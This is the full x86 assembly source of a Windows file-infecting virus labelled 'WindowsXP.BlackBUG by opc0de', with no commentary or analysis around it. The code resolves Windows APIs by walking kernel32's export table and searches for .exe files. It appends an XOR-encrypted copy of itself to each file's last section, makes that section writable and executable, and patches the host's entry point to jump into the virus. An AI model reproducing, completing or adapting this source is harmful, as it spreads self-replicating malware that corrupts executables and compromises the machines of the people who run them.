   .486p

   .model flat,stdcall

   include W32nt_lj.inc

       EXTRN ExitProcess:PROC


   .data

       nil db 'WindowsXP.BlackBUG by opc0de',0

   .code

   Start:

       jmp @@overdata

       Clean:




       ;Here the data begins

       virlen  equ  (@@Over - Start)
       virdat  equ  (@@overdata - Clean)
       base    dd   ?
       baseapi db   'GetProcAddress',0
       export  dd   ?
       file    dd   ?
       st_01   dd   ?
       oldeip  dd   ?
       imgbase dd   ?
       st_00   dd   ?
       temp    dd   ?
       foundgt WIN32_FIND_DATA <?>
       mask    db   '*.exe',0
       goat00  db   'calc.exe',0


   APINames:
         db 'CreateFileA',0,0
         db 'MapViewOfFile',0,0
         db 'CreateFileMappingA',0,0
         db 'FindFirstFileA',0,0
         db 'FindNextFileA',0,0
         db 'GetFileSize',0,0

   APIfunc:

       ACreateFileA dd ?
       AMapViewA    dd ?
       ACreateMappA dd ?
       AFindstA     dd ?
       AFindnxtA    dd ?
       AGetSizeA    dd ?


   @@overdata:

          call GetDeltaHandle ;Get delta handle

   GetDeltaHandle:
           pop ebp
           sub ebp,offset GetDeltaHandle

           cmp ebp,0
           jne  @@do_decrypt
           jmp @@co
   @@do_decrypt:
           call Encrypt

   @@co:

           mov eax,[esp]
           push [ebp+st_01]
           pop ebx
           mov  [ebp+oldeip],ebx
           push [ebp+st_00]
           pop ebx
           mov  [ebp+imgbase],ebx
   @@getbase:

           sub eax,1
           cmp word ptr [eax], 'ZM'
           je  @@getproc
           jmp @@getbase


   @@getproc:

           mov edx,[ebp+imgbase]
           add edx,[ebp+oldeip]
           push edx
           mov [ebp+base],eax

           add eax,[eax.MZ_lfanew]
           add eax,18h

           mov ebx,[eax.OH_DataDirectory.DE_Export.DD_VirtualAddress]
           add ebx,[ebp+base]
           mov [ebp+export],ebx

           mov esi,[ebx.ED_AddressOfNames]
           add esi,[ebp+base]
           mov ebx,esi
           xor eax,eax

   @@getname:
           inc eax
           mov esi,ebx
           mov esi,[esi]
           add esi,[ebp+base]
           add ebx,4
           mov ecx,0Eh
           lea edi,[ebp+baseapi]
           rep cmpsb
           je  @@foundname
           jmp @@getname

   @@foundname:

           dec eax
           mov ecx,4
           mul ecx
           mov ebx,[ebp+export]
           mov ebx,[ebx.ED_AddressOfFunctions]
           add ebx,[ebp+base]
           add ebx,eax
           mov edi,[ebx]
           add edi,[ebp+base]

   ;We have in EDI the address of GetProcAddress

           lea ebx,[ebp+APIfunc]
           lea esi,[ebp+APINames]
           xor ecx,ecx
           push ecx

   @@getapi:
           mov  ecx,[esp]
           cmp  ecx,6
           je   @@gotit
           push esi
           push [ebp+base]
           call edi
           mov  [ebx],eax
           add  ebx,4
           jmp  @@doesi

   @@doesi:

           inc esi
           cmp word ptr [esi],00h
           je  @@prepare
           jmp @@doesi

   @@prepare:
           add esi,2
           pop ecx
           inc ecx
           push ecx
           jmp @@getapi

   @@gotit:

           ;Save code

           lea esi,[ebp+Host_code]
           lea edi,[ebp+Temp_code]
           mov ecx,6
           rep movsb

           lea eax,[ebp+foundgt]
           push eax
           lea eax,[ebp+mask]
           push eax
           call [ebp+AFindstA]
           mov  [ebp+temp], eax
           lea  eax, [ebp+foundgt.WFD_cFileName]
           call INFECT

       @@findsomeass:

                       lea eax,[ebp+foundgt]
                       push eax
                       mov  eax,[ebp+temp]
                       push eax
                       call [ebp+AFindnxtA]
                       mov  [ebp+temp],eax

                       test eax, eax
                       je   @@exit

                       lea  eax, [ebp+foundgt.WFD_cFileName]

                       call INFECT
                       jmp  @@findsomeass





   @@exit:

                   lea edi,[ebp+Host_code]
                   lea esi,[ebp+Temp_code]
                   mov ecx,6
                   rep movsb

                   cmp ebp,0
                   je  @@clean
                   mov eax,[ebp+imgbase]
                   add eax,[ebp+oldeip]
                   mov edi,eax
                   mov ecx,6
                   lea esi,[ebp+Host_code]
                   rep movsb
                   jmp dword ptr eax


   @@clean:

           push 666
           call ExitProcess


   ; Infecting mechanism

   INFECT PROC


       push 0
       push 0
       push OPEN_EXISTING
       push 0
       push 0
       push GENERIC_READ or GENERIC_WRITE
       push eax
       call [ebp+ACreateFileA]
       cmp eax,-1
       je   @@endofproc

       mov  [ebp+file],eax

       push 0
       push eax
       call [ebp+AGetSizeA]
       mov  ebx,eax
       add  ebx,virlen
       add  ebx,100h ; extra work space
       mov  eax,[ebp+file] ;restore eax

                   push 0
                   push ebx
                   push 0
                   push PAGE_READWRITE
                   push 0
                   push eax
                   call [ebp+ACreateMappA]

                   push ebx
                   push 0
                   push 0
                   push FILE_MAP_ALL_ACCESS
                   push eax
                   call [ebp+AMapViewA]
                   mov  [ebp+base], eax
                   push eax
                   mov  esi,eax

                   add  esi,[esi.MZ_lfanew]
                   movzx eax,[esi.NumberOfSections]
                   dec   eax
                   add  esi,18h

                   mov  edi,esi
                   add   esi,0E0h
                   mov   ecx,SIZE IMAGE_SECTION_HEADER
                   mul   ecx
                   add   esi,eax

                   cmp dword ptr [esi.SH_PointerToRelocations],'nRoK'
                   je  @@cleanstack
                   mov dword ptr [esi.SH_PointerToRelocations],'nRoK'


                   or  dword ptr [esi.SH_Characteristics],00000020h
                           or  dword ptr [esi.SH_Characteristics],80000000h
                           or  dword ptr [esi.SH_Characteristics],20000000h

                   mov eax,[edi.OH_ImageBase]
                   mov [ebp+st_00],eax
                   mov eax,[edi.OH_AddressOfEntryPoint]
                   mov [ebp+st_01],eax

   ;Copy EPO
                   pushad

                   mov ebx,[esi.SH_VirtualAddress]
                   add ebx,[ebp+st_00]
                   add ebx,[esi.SH_VirtualSize]
                   mov [ebp+x],  ebx

                   mov esi,[ebp+base]
                   add esi,[esi.MZ_lfanew]
                   add esi,18h
                   add esi,0E0h

                   mov eax,[ebp+base]
                   add eax,[ebp+st_01]
                   add eax,[esi.SH_PointerToRawData]
                   sub eax,[esi.SH_VirtualAddress]




                   mov ecx,6
                   mov esi,eax
                   lea edi,[ebp+Host_code]
                   rep movsb

                   mov edi, eax
                   mov ecx, 6
                   lea esi,[ebp+EPO_opcode]
                   rep movsb

                   popad


                   mov ebx,[esi.SH_VirtualAddress]
                   add ebx,[esi.SH_VirtualSize]
           ;       mov [edi.OH_AddressOfEntryPoint],ebx

                   mov ebx,[ebp+base]
                   pop ebx

                   add ebx,[esi.SH_PointerToRawData]
                   add ebx,[esi.SH_VirtualSize]
                   mov edi,ebx
                   mov ecx,virlen
                   pushad
                   push ecx

                   call Encrypt

                   pop ecx
                   lea esi,[ebp+Start]
                   rep movsb

                   call Encrypt

                   popad




                   mov edi,[ebp+base]
                   add edi,[edi.MZ_lfanew]
                   add edi,18h

                   mov ebx,virlen

                   add   [esi.SH_VirtualSize],ebx
                   add   [esi.SH_SizeOfRawData],ebx



                   mov ebx,[esi.SH_VirtualAddress]
                   add ebx,[esi.SH_VirtualSize]
                   mov [edi.OH_SizeOfImage],ebx

                   mov eax,[ebp+base]
                   add eax,[eax.MZ_lfanew]
                   movzx ecx,[eax.NumberOfSections]
                   dec ecx
                   add eax,18h
                   mov ebx,[eax.OH_BaseOfCode]


   @@setcode:

           add eax,0E0h
           cmp [eax.SH_VirtualAddress],ebx
           je  @@setit
           loop @@setcode

   @@setit:
           or dword ptr [eax.SH_Characteristics],80000000h


   @@endofproc:


                   ret



   @@cleanstack:
               pop eax
               ret


   INFECT endp

   Encrypt PROC

       mov ecx,virdat
       lea ebx,[ebp+Clean]
   @@start_enc:

       xor byte ptr [ebx],cl
       add ebx,1
       loop @@start_enc

       ret

   Encrypt endp

   EPO_opcode:

           db 68h ;PUSH
           x       dd 0
           db 0C3h ;RET

   Host_code:

        db 6 dup (?)

   Temp_code:

        db 6 dup (0)


   @@Over:

   end Start
